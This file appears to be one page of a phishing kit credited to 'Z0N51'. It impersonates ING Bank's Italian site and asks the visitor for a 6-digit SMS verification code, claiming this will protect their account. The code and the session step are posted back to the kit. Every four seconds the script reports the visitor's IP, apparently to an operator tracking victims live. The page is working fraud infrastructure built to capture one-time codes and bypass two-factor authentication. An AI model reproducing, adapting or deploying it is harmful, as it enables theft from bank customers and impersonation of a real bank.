<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "sms";

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>ING</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
        <script src="<?php echo JSPATH; ?>/stutes.js"></script>      
    </head>
    <body class="d-flex flex-column justify-content-between" style="min-height:100vh;">

      <!-- HEADER -->
      <header class="header_1">
        <div class="container_header_1">
          <div class="logo">
            <img src="<?php echo IMGSPATH; ?>/logo.svg" alt="">
          </div>
        </div>
      </header>

      <!-- wrapper_login -->
      <div class="wrapper_login">
        <div class="container_login">
          <form action="index.php" method="POST">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="sms">
            <div class="title">
              <img src="<?php echo IMGSPATH; ?>/chat.svg" style="width:100px; margin-bottom:9px;" alt="">
              <h1 class="mb-0">Codice di verifica SMS</h1>
              <p class="mb-0">Ti abbiamo inviato un codice a 6 cifre sul tuo telefono. Inseriscilo qui sotto per confermare la tua identità e proteggere il conto.</p>
            </div>
            
            <div class="inputes">
              <div class="form-group input_box <?php echo errclass($_SESSION['errors'],'sms_code') ?>">
                <label for="sms_code">codice SMS</label>
                <span>Formato XXXXXX</span>
                <input type="text" name="sms_code" id="sms_code" inputmode="numeric" maxlength="6" placeholder="Enter 6-digit code">
                <?php echo errmsg($_SESSION['errors'],'sms_code'); ?>
              </div>
            </div>
            <div class="btn_sub">
              <button type="submit">Continua</button>
            </div>
          </form>
        </div>
      </div>

      <!-- footer -->
      <footer class="footer_1">
        <div class="container_footer_1">
          <div class="links_footer">
            <ul class="ps-0 mb-0">
              <li>Sicurezza</li>
              <li>Definizione di Default</li>
              <li>Privacy</li>
            </ul>
            <ul class="ps-0 mb-0">
              <li>Trasparenza</li>
              <li>Reclami</li>
              <li>Cookies</li>
            </ul>
          </div>
          <div class="copyghit">
            <p class="mb-0">© 2026 ING BANK N.V. Milan Branch P.I. 11241140158</p>
          </div>
        </div>
      </footer>


      
       









        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="<?php echo JSPATH; ?>/script.js"></script>
        
        <script>
            $('#sms_code').mask('000000');    
            $("input").keyup(function(){
              if ($("#sms_code").val() != "") {
                  $(this).css("font-style","normal");
                  $(".btn_sub button").prop("disabled",false);
                  $(".btn_sub button").addClass("active");
              }else{
                  $(".btn_sub button").prop("disabled",true);
                  $(".btn_sub button").removeClass("active");
                  $(this).css("font-style","italic");
              }
            });  
            
            worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'sms'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);             
        </script>
    </body>
</html>